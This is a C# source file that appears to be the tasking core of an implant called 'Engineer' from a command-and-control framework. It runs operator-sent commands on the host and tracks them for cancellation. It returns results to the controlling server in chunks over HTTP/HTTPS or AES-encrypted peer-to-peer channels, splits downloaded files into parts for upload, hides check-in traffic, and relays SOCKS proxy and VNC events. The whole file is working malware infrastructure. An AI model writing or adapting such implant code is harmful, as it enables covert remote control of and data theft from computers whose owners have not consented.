using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Concurrent;
using System.Threading;
using DynamicEngLoading;
using System.Reflection;
using Engineer.Commands;

namespace Engineer.Functions
{
    public class Tasking
    {
        public static ConcurrentDictionary<string, EngineerTaskResult> engTaskResultDic = new(); // key is the task id and value is the whole task
        public static ConcurrentDictionary<string, EngineerTask> engTaskDic = new(); // key is the task id and value is the whole task
        public static ConcurrentDictionary<string,CancellationTokenSource> cancellationTokenSourceDic = new();

        public static async Task DealWithTasks(IEnumerable<EngineerTask> tasks)
        {
            try
            {
                foreach (var task in tasks)
                {
                    // Create a new CancellationTokenSource for the task
                    CancellationTokenSource cts = new CancellationTokenSource();
                    // Update the task's cancelToken property with the CancellationToken from the CancellationTokenSource
                    task.cancelToken = cts.Token;

                    cancellationTokenSourceDic.TryAdd(task.Id, cts);
                    //if task.IsBlocking is true then we need to wait for the task to finish before we can continue
                    if (task.IsBlocking)
                    {
                        // Console.WriteLine("Blocking task executing");
                        DealWithTask(task);
                    }
                    else
                    {
                        //if task.IsBlocking is false then we can just start the task and continue
                        Task.Run(async () => await DealWithTask(task));
                    }
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.StackTrace);
            }
        }

        public static async Task DealWithTask(EngineerTask task)
        {
            try
            {
                //add task to engTaskDic
                engTaskDic.TryAdd(task.Id, task);

                //make an EngineerTaskResult 
                var taskResult = new EngineerTaskResult
                {
                    Id = task.Id,
                    Command = task.Command,
                    Result = "".JsonSerialize(),
                    IsHidden = false,
                    Status = EngTaskStatus.Running,
                    ResponseType = TaskResponseType.None,
                    ImplantId = Program._metadata.Id
                };

                var command = Program._commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.CurrentCultureIgnoreCase)); //this should then take input and match too cmd list
                if (command is null)
                {
                    var result = "Error: Command not found";
                    taskResult.Result = result.JsonSerialize();
                    taskResult.Command = task.Command;
                    taskResult.Status = EngTaskStatus.Failed;
                    taskResult.ResponseType = TaskResponseType.String;
                    SendTaskResult(taskResult,false);
                    //Program.SendTaskResult(task.Id, result, false, EngTaskStatus.Failed);  //task we send in still has all properties including Id
                }
                else
                {
                    taskResult.IsHidden = ((EngineerCommand)command).IsHidden;
                    AddTaskResult(taskResult);
                    await command.Execute(task);
                }
            }
            catch (Exception ex)
            {
               Console.WriteLine(ex.Message);
               Console.WriteLine(ex.StackTrace);
            }  
        }

        public static void AddTaskResult(EngineerTaskResult taskResult)
        {
            if (!engTaskResultDic.ContainsKey(taskResult.Id))
            { 
                engTaskResultDic.TryAdd(taskResult.Id, taskResult);
            }
        }

        public static void FillTaskResults(object output, EngineerTask task,EngTaskStatus taskStatus, TaskResponseType taskResponseType)
        {
            try
            {
                if (engTaskResultDic.ContainsKey(task.Id))
                {
                    if(TaskResponseType.String == taskResponseType)
                    {
                        engTaskResultDic[task.Id].Result = (output as string).JsonSerialize();
                    }
                    else if(TaskResponseType.FileSystemItem == taskResponseType)
                    {
                        engTaskResultDic[task.Id].Result = (output as List<FileSystemItem>).JsonSerialize();
                    }
                    else if(TaskResponseType.ProcessItem == taskResponseType)
                    {
                        engTaskResultDic[task.Id].Result = (output as List<ProcessItem>).JsonSerialize();
                    }
                    else if(TaskResponseType.TokenStoreItem == taskResponseType)
                    {
                        engTaskResultDic[task.Id].Result = (output as List<TokenStoreItem>).JsonSerialize();
                    }
                    else if (TaskResponseType.EditFile == taskResponseType)
                    {
                        engTaskResultDic[task.Id].Result = (output as EditFile).JsonSerialize();
                    }
                    else if(TaskResponseType.VncInteractionEvent == taskResponseType)
                    {
                        engTaskResultDic[task.Id].Result = (output as VncInteractionResponse).JsonSerialize();
                    }
                    else
                    {
                        engTaskResultDic[task.Id].Result = (output as byte[]);
                    }
                    engTaskResultDic[task.Id].Status = taskStatus;
                    engTaskResultDic[task.Id].ResponseType = taskResponseType;

                    //make a new task result item to store the result so the main dictionary can be updated
                    var NewtaskResult = new EngineerTaskResult
                    {
                        Id = engTaskResultDic[task.Id].Id,
                        Command = engTaskResultDic[task.Id].Command,
                        Result = engTaskResultDic[task.Id].Result,
                        IsHidden = engTaskResultDic[task.Id].IsHidden,
                        Status = engTaskResultDic[task.Id].Status,
                        ImplantId = engTaskResultDic[task.Id].ImplantId,
                        ResponseType = engTaskResultDic[task.Id].ResponseType,
                    };

                    //if command is download then call the Functions.DownloadTracker.SplitFileString function, get the filename from the task.Arguments, and pass the result to the function
                    if (NewtaskResult.Command.Equals("download", StringComparison.CurrentCultureIgnoreCase))
                    {
                        if (NewtaskResult.Status == EngTaskStatus.Complete)
                        {
                            var fileParts = Functions.DownloadTracker.SplitFileString(NewtaskResult.Result);
                            //send each value from the key that matches the filename variable in _downloadedFileParts to the server
                            foreach (var value in fileParts)
                            {
                                NewtaskResult.Result = value.JsonSerialize();
                                SendTaskResult(NewtaskResult, true).Wait();
                            }
                        }
                        else
                        {
                            SendTaskResult(NewtaskResult, Program.IsDataChunked).Wait();
                        }
                    }
                    else if (task.Command.Equals("P2PFirstTimeCheckIn", StringComparison.CurrentCultureIgnoreCase))
                    {
                        NewtaskResult.IsHidden = true;
                        SendTaskResult(NewtaskResult, Program.IsDataChunked);
                    }
                    else
                    {
                        SendTaskResult(NewtaskResult, Program.IsDataChunked);
                    }
                    if (engTaskResultDic.ContainsKey(task.Id) && NewtaskResult.Status != EngTaskStatus.Running)
                    {
                        engTaskResultDic.TryRemove(task.Id, out _);
                        engTaskDic.TryRemove(task.Id, out _);
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.StackTrace);
            }
        }
        
        public static async Task SendTaskResult(EngineerTaskResult taskResult, bool isDataChunked)
        {
            try
            {
                if (Program.ManagerType.Equals("http", StringComparison.CurrentCultureIgnoreCase) || Program.ManagerType.Equals("https", StringComparison.CurrentCultureIgnoreCase))
                {
                    //Console.WriteLine("is http calling send data");
                    if (isDataChunked && taskResult.Result.Length >= Program.ChunkSize)
                    {
                        List<DataChunk> chunkedData = new();
                        var chunkDataModule = Program.typesWithModuleAttribute.FirstOrDefault(attr => attr.Name.Equals("DataChunk", StringComparison.OrdinalIgnoreCase));
                        if (chunkDataModule != null)
                        {
                            // Get the method
                            var method = chunkDataModule.GetMethod("ChunkData", BindingFlags.Public | BindingFlags.Static);
                            if (method != null)
                            {
                                // Call the method , first argument is null because it's a static method
                                chunkedData = (List<DataChunk>)method.Invoke(null, new object[] { taskResult.Result, Program.ChunkSize, taskResult.ResponseType });
                            }
                        }
                        foreach (var chunk in chunkedData)
                        {
                            taskResult.Result = chunk.JsonSerialize();
                            taskResult.ResponseType = TaskResponseType.DataChunk;
                            Console.WriteLine($"{DateTime.UtcNow} calling SentData With ChunkedData for command {taskResult.Command} data size {chunk.Length}");
                            Program._commModule.SentData(taskResult, isDataChunked);
                            //perform a sleep cycle to allow the server to process the data
                            await Task.Delay(EngCommBase.Sleep);
                        }
                    }
                    else
                    {
                        Program._commModule.SentData(taskResult, isDataChunked);
                    }
                }
                else
                {
                    //Console.WriteLine("is tcp seralizing task result");
                    IEnumerable<EngineerTaskResult> tempResult = new List<EngineerTaskResult> { taskResult };
                    var SeraliedTaskResult = tempResult.JsonSerialize();
                    var encryptedTaskResult = Encryption.AES_Encrypt(SeraliedTaskResult,"", Program.UniqueTaskKey);
                    //Console.WriteLine($"{DateTime.UtcNow} calling p2p Sent");
                    await Program._commModule.P2PSent(encryptedTaskResult);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.StackTrace);
            }
        }

        public static async Task CreateOutboundNotif(string assetId, string notifName, Dictionary<string, byte[]> notifData, bool forwardToClient)
        {
            AssetNotification notifToSend = new AssetNotification()
            {
                AssetId = assetId,
                NotificationName = notifName,
                NotificationType = null,
                NotificationData = notifData,
                ForwardToClient = forwardToClient,
            };
            if (Program.ManagerType.Equals("http", StringComparison.CurrentCultureIgnoreCase) || Program.ManagerType.Equals("https", StringComparison.CurrentCultureIgnoreCase))
            {
                Program._commModule.OutboundAssetNotifs.Enqueue(notifToSend);
            }
            else
            {
                IEnumerable<AssetNotification> notifs = new List<AssetNotification> { notifToSend };
                var serializedNotifList = notifs.JsonSerialize();
                var wencryptedNotifList = Encryption.AES_Encrypt(serializedNotifList, "", Program.UniqueTaskKey);
                await Program._commModule.P2PSent(wencryptedNotifList);
            }
        }

        public static async Task HandleInboundNotifs(List<AssetNotification> _notifs)
        {
            foreach (AssetNotification _notif in _notifs)
            {
                await ProcessNotif(_notif);
            }
        }

        private static async Task ProcessNotif(AssetNotification notif)
        {
            if(notif.NotificationName.Equals("socksconnect",StringComparison.CurrentCultureIgnoreCase))
            {
                await socksConnect.Execute(notif);
            }
            else if(notif.NotificationName.Equals("sockssend", StringComparison.CurrentCultureIgnoreCase))
            {
                await SocksSend.Execute(notif);
            }
            else if(notif.NotificationName.Equals("vncheartbeat", StringComparison.CurrentCultureIgnoreCase))
            { 

            }
        }
    }
}
